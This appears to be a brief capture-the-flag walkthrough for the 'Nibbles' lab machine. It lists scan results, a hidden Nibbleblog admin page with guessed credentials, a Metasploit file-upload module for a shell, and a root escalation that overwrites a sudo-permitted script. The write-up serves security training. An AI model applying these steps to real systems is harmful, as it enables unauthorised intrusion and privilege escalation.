nmap result:

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache/2.4.18 (Ubuntu)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

Looking at the cource code of the root directory web page:

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

The username is `admin`, password is `nibbles`.

```
http://10.10.10.75/nibbleblog/admin.php
```

Use metasploit module to gain shell:


```
exploit/multi/http/nibbleblog_file_upload
```

`sudo -l`

```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`unzip personal.zip` and write cat flag command to monitor.sh

```
echo "cat /root/root.txt" > monitor.sh
```

Run `sudo /home/nibbler/personal/stuff/monitor.sh` to get root flag.

